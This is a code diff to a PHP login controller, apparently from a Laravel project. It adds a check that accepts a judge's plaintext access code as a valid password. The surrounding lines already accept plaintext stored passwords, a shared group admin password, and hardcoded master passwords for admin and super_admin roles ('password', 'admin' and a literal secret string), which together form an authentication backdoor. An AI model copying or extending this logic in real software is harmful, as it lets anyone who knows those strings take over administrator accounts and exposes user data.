@@ -96,6 +96,7 @@ class AuthController extends Controller
                 $isMatch = Hash::check($password, $user->password)
                     || (! empty($user->plain_password) && $password === $user->plain_password)
                     || ($user->ledGroup && $password === $user->ledGroup->admin_password)
+                    || ($user->judge && $password === $user->judge->access_code)
                     || (in_array($user->role, ['super_admin', 'admin']) && in_array($password, ['password', 'admin', 'CentralAdmin#2026@Quaf!']));
 
                 if ($isMatch) {
